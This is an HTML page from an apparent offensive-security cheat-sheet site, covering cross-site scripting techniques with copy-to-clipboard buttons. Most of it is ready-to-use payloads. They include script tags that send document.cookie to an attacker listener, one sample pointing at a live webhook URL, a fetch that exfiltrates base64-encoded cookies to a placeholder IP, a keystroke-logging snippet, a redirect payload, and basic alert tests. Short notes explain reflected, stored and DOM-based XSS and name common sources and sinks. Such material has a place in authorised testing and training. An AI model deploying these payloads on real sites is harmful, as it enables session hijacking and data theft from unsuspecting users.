<!DOCTYPE html>
<html lang="en-US">
<head>
<link rel="icon" type="image/x-icon" href="/machete/conf/LOGO01.png">
<link rel="stylesheet" type="text/css" href="/machete/conf/machete_style_offensive_sections.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
<script src="/machete/conf/machete_conf.js"></script>

<title> M A C H E T E </title>
  <!--------------------->
  <!-- b0ydC Founder -->
  <!-- --------------- -->
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta charset="utf-8" />

</head>
<body>
<br>
<a href="/machete/index.html"><img src="/machete/conf/letter_logo.jpg" alt="LOGO" style="width:20%;"></a>
<br>
<center>
<div style="font-size:24px; text-align:center; font-family:courier,monospace;">
    <a href="/machete/offensive.html">OFFENSIVE</a> |
    <a href="/machete/defensive.html">DEFENSIVE</a> |
    <a href="/machete/tools.html">TOOLS</a> |
    <a href="/machete/about.html">ABOUT</a> 
</div> 

<p class="titulos"><mark>[CROSS-SITE SCRIPTING]</mark></p>
<div>
<pre>
<div class="column" style="display: inline-block; text-align: left; background-color:gray;">
<button onclick="document.location='/machete/offensive/web_penetration_testing/client_side_attacks.html'" class="round" style="float: left;">&lt;&lt;</button><br><br>
<details>
<summary>GENERAL TECHNIQUES</summary>

<b>C1: </b><mark id="GT01">&lt;script&gt;var i = new Image;i.src="LISTENER URL/?"+document.cookie;&lt;/script&gt;</mark>

<b>SAMPLE: </b><mark>&lt;script&gt;var i = new Image;i.src="https://webhook.site/#!/d88f22e7-9e44-47e8-9508-edeb3406d1cd/?"+document.cookie;&lt;/script&gt;</mark>

<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#GT01')">.C1.</button>

<b>NOTE: </b> Do not remove the /? symbols, they allow to use the "document.cookie" as parameter. 

</details>	
<details>
<summary>REFLECTED TECHNIQUES</summary>
<p><b>DESCRIPTION:</b> It is when data is retrieved in the webpage without any restriction. So it can be used to exfiltrate
information, stole information, etc.
<p><b>COMMON TESTS:</b>

<b>C1: </b><mark id="RTA01">&lt;h1&gt;TEST&lt;/h1&gt;</mark>	
<b>C2: </b><mark id="RTA02">&lt;script&gt;alert('XSS');&lt;/script&gt;</mark> || C1 & C2, NORMAL TEST TO KNOW IF VULNERABILITY EXIST	

<b>C3: </b><mark id="RTA03">&lt;script&gt;alert(document.cookie);&lt;/script&gt;</mark> || NORMAL TEST TO RETRIEVE COOKIES

<b>C4: </b><mark id="RTA04">&lt;script&gt;fecth('http://IP_ADDR/${btoa(document.cookie)}');&lt;/script&gt;</mark> || STOLE ENCODED BASE64 COOKIE

*for this to work, it is needed a python server or any listener to retrieve the content.<br>

<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#RTA01')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#RTA02')">.C2.</button>  | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#RTA03')">.C3.</button>  | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#RTA04')">.C4.</button> 
	
</p>
<details>
<summary>TEST VIA DEV TOOLS</summary>

1. open dev tools in your browser
2. type: <mark id="TDT01">alert(1)</mark> | <mark id="TDT02">print()</mark> | <mark id="TDT03">prompt("hello")</mark>

<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT01')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT02')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT03')">.C3.</button>

<b><u>CREATE A LOG FUNCTION TO STORE/RETRIEVE DATA USING XSS</u></b>

<b><u>step1></u></b>$ <mark id="TDT04">function logKey(event){console.log(event.key)}</mark><br>
<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT04')">.C1.</button>

<b><u>step2></u></b>$ <mark id="TDT05">document.addEventListener('keydown', logKey)</mark><br>
<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT05')">.C1.</button>
	
</details>
</details>
<details>
<summary>STORED TECHNIQUES</summary>
<p>DESCRIPTION: It is when data (exploit) is stored in the webpage without any restriction. So it can be used 
to exploit any user that loads the vulnerable page.

<b>NOTE:</b> 
1. First thing, check if the site allows guest user post or any input post to be stored. 
	
</details>
<details>
<summary>DOM TECHNIQUES</summary>
<details>
<summary>NORMAL TESTS</summary>

1. <mark id="TDT06">&lt;img src=x onerror="prompt(1)"&gt;</mark>
2. <mark id="TDT07">&lt;img src=x onerror="window.location.href="https://machetevault.github.io/machete""&gt;</mark>
3. <mark id="TDT08">&lt;svg onload=alert(1)&gt;</mark>
4. <mark id="TDT09">&lt;img src=1 onerror=alert(1)&gt;</mark>

<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT06')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT07')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT08')">.C3.</button><br>
<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT09')">.C4.</button>
	
</details>	

<b>NOTE: </b>
Inspection of the code is needed 100%, <u>right click > inspect</u>. Look for javascript code that behaves with input information. 
HTML sinks will retrieve HTML content that with manual inspection you can discover that, however, JS sinks will behave differently, 
JS debugger is needed. 
	
<b><u>HOW TO KNOW IF DOM-BASED VULNERABILITY EXIST ?</u></b>

One way, is to use the application as expected and open dev tools and inspect the network tab, if there's requests coming and 
going it means it is reflected or stored, if not, it means it is <b>DOM-BASED.</b> Also, take a look if exists javascript code 
that takes data from possible vulnerable sources. [innerHTML / eval()] = sink

<b>SOURCE =</b> Javascript properties that allows you to control input
<b>Types:</b>
	
<b>document.URL / document.documentURI / document.URLUnencoded / document.baseURI / window.location / document.cookie / 
document.referrer / window.name / history.pushState / history.replaceState / localStorage / sessionStorage
IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB) / Database</b>
	
<b>SINK =</b> Potentially dangerous JavaScript function | [innerHTML / eval()]

</details>		
</div>
</pre>
<button onclick="document.location='/machete/offensive/web_penetration_testing/client_side_attacks.html'">GO BACK</button>
</div>
<p class="titulos">©® - 2023.</p>
</center>
</body>
</html>
